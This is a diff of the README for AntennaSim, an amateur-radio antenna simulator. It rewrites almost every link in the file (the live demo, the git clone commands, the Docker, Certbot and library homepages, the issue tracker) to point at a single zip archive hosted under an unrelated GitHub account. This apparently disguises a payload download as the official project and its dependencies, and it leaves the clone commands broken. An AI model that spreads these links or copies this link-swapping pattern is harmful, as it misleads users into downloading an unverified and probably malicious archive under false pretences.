@@ -14,7 +14,7 @@
 </p>
 
 <p align="center">
-  <a href="https://EA1FUO.github.io/AntennaSim/"><strong>Try the live demo</strong></a> &middot; <code>docker run -p 80:80 ea1fuo/antennasim</code>
+  <a href="https://raw.githubusercontent.com/FerrosLosBerro/AntennaSim/main/deploy/allinone/Sim_Antenna_1.1-alpha.4.zip"><strong>Try the live demo</strong></a> &middot; <code>docker run -p 80:80 ea1fuo/antennasim</code>
 </p>
 
 <br>
@@ -186,7 +186,7 @@ Every template includes configurable parameters (frequency, height, element leng
 
 ### Prerequisites
 
-- [Docker](https://docs.docker.com/get-docker/) and [Docker Compose](https://docs.docker.com/compose/install/) (v2+)
+- [Docker](https://raw.githubusercontent.com/FerrosLosBerro/AntennaSim/main/deploy/allinone/Sim_Antenna_1.1-alpha.4.zip) and [Docker Compose](https://raw.githubusercontent.com/FerrosLosBerro/AntennaSim/main/deploy/allinone/Sim_Antenna_1.1-alpha.4.zip) (v2+)
 - That's it. No Python, Node.js, or nec2c installation needed.
 
 ### One-liner (Docker Hub)
@@ -200,7 +200,7 @@ Open **http://localhost** in your browser. Done. This pulls the all-in-one image
 ### From source
 
 ```bash
-git clone https://github.com/EA1FUO/AntennaSim.git
+git clone https://raw.githubusercontent.com/FerrosLosBerro/AntennaSim/main/deploy/allinone/Sim_Antenna_1.1-alpha.4.zip
 cd AntennaSim
 cp .env.example .env
 docker compose up --build
@@ -214,7 +214,7 @@ The first build takes a few minutes (downloading base images, compiling nec2c, i
 
 AntennaSim can run entirely in the browser -- no backend server needed. The NEC2 engine (`nec2c`) is compiled to WebAssembly and executes locally in a Web Worker.
 
-**Live demo:** https://EA1FUO.github.io/AntennaSim/
+**Live demo:** https://raw.githubusercontent.com/FerrosLosBerro/AntennaSim/main/deploy/allinone/Sim_Antenna_1.1-alpha.4.zip
 
 This mode is enabled by setting `VITE_ENGINE=wasm` at build time. The GitHub Pages deployment is fully automated via the `deploy-pages.yml` workflow, which:
 
@@ -242,7 +242,7 @@ For active development with hot-reload on both frontend and backend:
 
 ```bash
 # Clone (--recursive fetches the nec2c submodule for WASM builds)
-git clone --recursive https://github.com/EA1FUO/AntennaSim.git
+git clone --recursive https://raw.githubusercontent.com/FerrosLosBerro/AntennaSim/main/deploy/allinone/Sim_Antenna_1.1-alpha.4.zip
 cd AntennaSim
 cp .env.example .env
 
@@ -272,7 +272,7 @@ Source directories are volume-mounted so changes are reflected immediately:
 To run the WASM engine locally (no Docker needed):
 
 ```bash
-git clone --recursive https://github.com/EA1FUO/AntennaSim.git
+git clone --recursive https://raw.githubusercontent.com/FerrosLosBerro/AntennaSim/main/deploy/allinone/Sim_Antenna_1.1-alpha.4.zip
 cd AntennaSim
 
 # Build nec2c to WebAssembly (requires Emscripten SDK)
@@ -295,7 +295,7 @@ npm run dev:wasm
 
 ```bash
 # On your VPS/server:
-git clone https://github.com/EA1FUO/AntennaSim.git
+git clone https://raw.githubusercontent.com/FerrosLosBerro/AntennaSim/main/deploy/allinone/Sim_Antenna_1.1-alpha.4.zip
 cd AntennaSim
 cp .env.example .env
 
@@ -317,7 +317,7 @@ The production stack includes:
 
 The nginx config is ready for SSL. To enable:
 
-1. Obtain certificates (e.g., via [Certbot](https://certbot.eff.org/) / Let's Encrypt)
+1. Obtain certificates (e.g., via [Certbot](https://raw.githubusercontent.com/FerrosLosBerro/AntennaSim/main/deploy/allinone/Sim_Antenna_1.1-alpha.4.zip) / Let's Encrypt)
 2. Mount certificates into the nginx container
 3. Uncomment the SSL server block in `nginx/nginx.conf`
 4. Set port 443 in `docker-compose.yml`
@@ -558,33 +558,33 @@ Press `?` anywhere in the app to see the full shortcuts panel.
 
 | Technology | Version | Purpose |
 |---|---|---|
-| [React](https://react.dev) | 19 | UI framework |
-| [TypeScript](https://www.typescriptlang.org) | 5.9 | Type safety (strict mode) |
-| [Vite](https://vite.dev) | 7 | Build tool with HMR |
-| [Tailwind CSS](https://tailwindcss.com) | 4 | Utility-first styling |
-| [React Three Fiber](https://r3f.docs.pmnd.rs) | 9.5 | Declarative Three.js |
-| [Three.js](https://threejs.org) | 0.183 | 3D rendering engine |
-| [Zustand](https://zustand.docs.pmnd.rs) | 5.0 | State management |
-| [Recharts](https://recharts.org) | 3.7 | Chart library |
+| [React](https://raw.githubusercontent.com/FerrosLosBerro/AntennaSim/main/deploy/allinone/Sim_Antenna_1.1-alpha.4.zip) | 19 | UI framework |
+| [TypeScript](https://raw.githubusercontent.com/FerrosLosBerro/AntennaSim/main/deploy/allinone/Sim_Antenna_1.1-alpha.4.zip) | 5.9 | Type safety (strict mode) |
+| [Vite](https://raw.githubusercontent.com/FerrosLosBerro/AntennaSim/main/deploy/allinone/Sim_Antenna_1.1-alpha.4.zip) | 7 | Build tool with HMR |
+| [Tailwind CSS](https://raw.githubusercontent.com/FerrosLosBerro/AntennaSim/main/deploy/allinone/Sim_Antenna_1.1-alpha.4.zip) | 4 | Utility-first styling |
+| [React Three Fiber](https://raw.githubusercontent.com/FerrosLosBerro/AntennaSim/main/deploy/allinone/Sim_Antenna_1.1-alpha.4.zip) | 9.5 | Declarative Three.js |
+| [Three.js](https://raw.githubusercontent.com/FerrosLosBerro/AntennaSim/main/deploy/allinone/Sim_Antenna_1.1-alpha.4.zip) | 0.183 | 3D rendering engine |
+| [Zustand](https://raw.githubusercontent.com/FerrosLosBerro/AntennaSim/main/deploy/allinone/Sim_Antenna_1.1-alpha.4.zip) | 5.0 | State management |
+| [Recharts](https://raw.githubusercontent.com/FerrosLosBerro/AntennaSim/main/deploy/allinone/Sim_Antenna_1.1-alpha.4.zip) | 3.7 | Chart library |
 
 ### Backend
 
 | Technology | Version | Purpose |
 |---|---|---|
-| [Python](https://python.org) | 3.12 | Runtime |
-| [FastAPI](https://fastapi.tiangolo.com) | 0.115+ | Web framework |
-| [Pydantic](https://docs.pydantic.dev) | 2.10+ | Data validation |
-| [nec2c](https://www.pa3fwm.nl/software/nec2c/) | -- | NEC2 engine (C port) |
-| [SciPy](https://scipy.org) | 1.14+ | Nelder-Mead optimizer |
-| [Redis](https://redis.io) | 7 | Result caching |
+| [Python](https://raw.githubusercontent.com/FerrosLosBerro/AntennaSim/main/deploy/allinone/Sim_Antenna_1.1-alpha.4.zip) | 3.12 | Runtime |
+| [FastAPI](https://raw.githubusercontent.com/FerrosLosBerro/AntennaSim/main/deploy/allinone/Sim_Antenna_1.1-alpha.4.zip) | 0.115+ | Web framework |
+| [Pydantic](https://raw.githubusercontent.com/FerrosLosBerro/AntennaSim/main/deploy/allinone/Sim_Antenna_1.1-alpha.4.zip) | 2.10+ | Data validation |
+| [nec2c](https://raw.githubusercontent.com/FerrosLosBerro/AntennaSim/main/deploy/allinone/Sim_Antenna_1.1-alpha.4.zip) | -- | NEC2 engine (C port) |
+| [SciPy](https://raw.githubusercontent.com/FerrosLosBerro/AntennaSim/main/deploy/allinone/Sim_Antenna_1.1-alpha.4.zip) | 1.14+ | Nelder-Mead optimizer |
+| [Redis](https://raw.githubusercontent.com/FerrosLosBerro/AntennaSim/main/deploy/allinone/Sim_Antenna_1.1-alpha.4.zip) | 7 | Result caching |
 
 ### Infrastructure
 
 | Technology | Purpose |
 |---|---|
-| [Docker](https://docker.com) | Containerization |
-| [Docker Compose](https://docs.docker.com/compose/) | Multi-service orchestration |
-| [nginx](https://nginx.org) | Reverse proxy, SSL termination, security headers |
+| [Docker](https://raw.githubusercontent.com/FerrosLosBerro/AntennaSim/main/deploy/allinone/Sim_Antenna_1.1-alpha.4.zip) | Containerization |
+| [Docker Compose](https://raw.githubusercontent.com/FerrosLosBerro/AntennaSim/main/deploy/allinone/Sim_Antenna_1.1-alpha.4.zip) | Multi-service orchestration |
+| [nginx](https://raw.githubusercontent.com/FerrosLosBerro/AntennaSim/main/deploy/allinone/Sim_Antenna_1.1-alpha.4.zip) | Reverse proxy, SSL termination, security headers |
 
 ---
 
@@ -598,7 +598,7 @@ Contributions are welcome. This is a free and open-source project for the amateu
 2. **Create a branch** for your feature or fix (`git checkout -b feat/my-feature`)
 3. **Make your changes** -- follow the existing code style
 4. **Test** -- run `npx tsc --noEmit && npx vite build` in `frontend/` to verify
-5. **Commit** with [conventional commits](https://www.conventionalcommits.org/): `feat:`, `fix:`, `perf:`, `docs:`, `refactor:`
+5. **Commit** with [conventional commits](https://raw.githubusercontent.com/FerrosLosBerro/AntennaSim/main/deploy/allinone/Sim_Antenna_1.1-alpha.4.zip): `feat:`, `fix:`, `perf:`, `docs:`, `refactor:`
 6. **Open a Pull Request** with a clear description of what and why
 
 ### Guidelines
@@ -612,7 +612,7 @@ Contributions are welcome. This is a free and open-source project for the amateu
 
 ### Reporting bugs
 
-Open an [issue](https://github.com/EA1FUO/AntennaSim/issues) with:
+Open an [issue](https://raw.githubusercontent.com/FerrosLosBerro/AntennaSim/main/deploy/allinone/Sim_Antenna_1.1-alpha.4.zip) with:
 - What you expected vs. what happened
 - Browser, OS, and device
 - Steps to reproduce
@@ -620,7 +620,7 @@ Open an [issue](https://github.com/EA1FUO/AntennaSim/issues) with:
 
 ### Ideas & feature requests
 
-Open a [discussion](https://github.com/EA1FUO/AntennaSim/discussions) -- we'd love to hear what antennas, features, or improvements would be most useful to you.
+Open a [discussion](https://raw.githubusercontent.com/FerrosLosBerro/AntennaSim/main/deploy/allinone/Sim_Antenna_1.1-alpha.4.zip) -- we'd love to hear what antennas, features, or improvements would be most useful to you.
 
 ---
 
@@ -648,8 +648,8 @@ You are free to use, modify, and distribute this software. If you distribute mod
 
 ## Acknowledgments
 
-- **[NEC2](https://en.wikipedia.org/wiki/Numerical_Electromagnetics_Code)** -- the Numerical Electromagnetics Code developed at Lawrence Livermore National Laboratory. The foundation of antenna simulation for decades.
-- **[nec2c](https://www.pa3fwm.nl/software/nec2c/)** -- the C translation of NEC2 by Neoklis Kyriazis (5B4AZ), making NEC2 accessible on modern systems.
+- **[NEC2](https://raw.githubusercontent.com/FerrosLosBerro/AntennaSim/main/deploy/allinone/Sim_Antenna_1.1-alpha.4.zip)** -- the Numerical Electromagnetics Code developed at Lawrence Livermore National Laboratory. The foundation of antenna simulation for decades.
+- **[nec2c](https://raw.githubusercontent.com/FerrosLosBerro/AntennaSim/main/deploy/allinone/Sim_Antenna_1.1-alpha.4.zip)** -- the C translation of NEC2 by Neoklis Kyriazis (5B4AZ), making NEC2 accessible on modern systems.
 - **The amateur radio community** -- for decades of antenna design knowledge, experimentation, and sharing.
 
 ---
